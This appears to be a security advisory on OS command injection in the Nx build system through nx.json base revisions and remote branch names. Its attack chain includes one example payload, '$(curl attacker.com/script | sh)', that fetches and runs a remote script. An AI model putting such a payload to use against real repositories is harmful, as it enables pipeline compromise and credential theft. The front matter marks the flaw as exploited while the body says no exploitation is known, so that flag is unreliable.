---
title: OS Command Injection in Nx via Git Revisions and Remote Refs
slug: 2026-10-nx-command-injection
description: The Nx build system contains OS command injection vulnerabilities in `nx affected` and `nx import` commands, allowing attackers to execute arbitrary code via malicious git revision strings or remote branch names.
date: "2026-10-06T00:45:33Z"
type: threat
types:
  - threat
severities:
  - high
exploited: true
tags:
  - command-injection
  - build-system
  - ci-cd
  - remote-code-execution
vendors:
  - Nx
products:
  - nx (>= 14.0.0, < 22.7.8)
  - nx (>= 23.0.0, < 23.1.1)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: The Nx core build system constructs shell command strings with untrusted values interpolated into them, and they are parsed by /bin/sh.
    confidence_band: high
references:
  - https://github.com/advisories/GHSA-w2vw-w76x-qr89
action_plan:
  priority: elevated
  owners:
    - DevOps
    - Security Engineering
  immediate_actions:
    - action: Upgrade nx package to 22.7.8 or 23.1.1
      owner: DevOps
      due: 24h
      evidence: Source explicitly identifies these versions as patched.
  mitigation_plan:
    - priority: immediate
      action: Review and restrict processing of untrusted pull requests in CI/CD
      owner: DevOps
      addresses: Arbitrary command execution in CI
      evidence: CI/CD runners are specifically noted as a high-risk target.
---

Nx core is vulnerable to multiple OS command injection flaws where untrusted git inputs are interpolated into shell command strings. The vulnerabilities exist in two primary workflows: `affected` commands and `nx import`. In the `affected` workflow, values from `nx.json` (`defaultBase` / `affected.defaultBase`) or the `NX_BASE` / `NX_HEAD` environment variables are used to construct `git` commands. Because these strings are processed by `/bin/sh` without proper sanitization, an attacker can inject command substitution payloads using `$(...)` syntax, even when wrapped in double quotes. 

In the `nx import` workflow, the `GitRepository` helper interpolates remote branch names - controlled by the owner of a remote repository - into various `git` operations including `fetch`, `checkout`, and `config`. An attacker who controls a repository can force arbitrary command execution on any machine that runs an `nx` command against it. This is particularly critical in CI/CD environments where pull requests containing modified `nx.json` files are automatically processed by runners. This vulnerability affects Nx versions >= 14.0.0 and < 22.7.8, and versions 23.0.0 to 23.1.0.

## Attack Chain

1. Attacker crafts a malicious repository or a pull request containing a manipulated `nx.json` file.
2. The attacker modifies the `defaultBase` or `affected.defaultBase` field in `nx.json` to include shell command substitution payloads (e.g., `$(curl attacker.com/script | sh)`).
3. A victim (developer or CI/CD runner) clones the repository or fetches the attacker's pull request branch.
4. The victim executes a standard Nx command, such as `nx affected` or `nx show projects --affected`.
5. The Nx CLI reads the manipulated `nx.json` configuration and builds a `git merge-base` or `git diff` shell command string containing the malicious payload.
6. The system executes the resulting string via `/bin/sh`, triggering the command substitution and executing the attacker's code.
7. The attacker's payload executes with the privileges of the victim user or CI service account.

## Impact

Successful exploitation allows for arbitrary command execution on developer workstations or CI/CD build servers. If triggered in a CI environment, this could lead to full compromise of the build pipeline, exfiltration of environment secrets (e.g., cloud credentials, API keys), or the injection of malicious code into downstream software artifacts. There are no known instances of exploitation in the wild at this time, but the vector is highly accessible to anyone capable of submitting a pull request to an Nx-based project.

## Recommendation

Prioritized actions for security teams:
* Upgrade all instances of `nx` to version 22.7.8 or 23.1.1 immediately using the `nx migrate` command.
* For CI/CD environments, audit build configurations to ensure that `nx.json` files from untrusted sources or external pull requests are treated as untrusted and not processed automatically in privileged contexts.
* Monitor CI/CD logs for unexpected child processes spawned by the `nx` CLI or related `git` sub-processes.
* Restrict `nx import` usage to verified and trusted repositories only.
